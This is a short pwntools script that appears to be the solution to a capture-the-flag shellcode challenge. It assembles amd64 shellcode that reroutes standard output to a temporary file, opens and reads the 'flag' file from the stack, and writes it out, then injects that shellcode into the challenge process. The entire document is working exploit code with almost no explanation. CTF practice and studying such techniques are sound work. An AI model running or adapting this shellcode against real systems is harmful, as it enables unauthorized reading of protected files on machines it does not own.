# access in ssh and type the code below in your_code.py and execute it

from pwn import *

context.arch = "amd64"

rem = process("./chall")

payload = asm(shellcraft.open("/tmp/temp.txt",0x42,777))
payload += asm(shellcraft.dup2('rax', 1) )
payload += asm(shellcraft.open("./flag", 0))
payload += asm("mov rdi, rax")
payload += asm("mov rsi, rsp")
payload += asm("sub rsi, 0x40")
payload += asm(shellcraft.read("rdi", "rsi", 0x40))
payload += asm(shellcraft.write(1, "rsi", 0x40))
rem.sendlineafter(b":) ", payload)
rem.recvuntil(b"bliiiiiiiiind\n")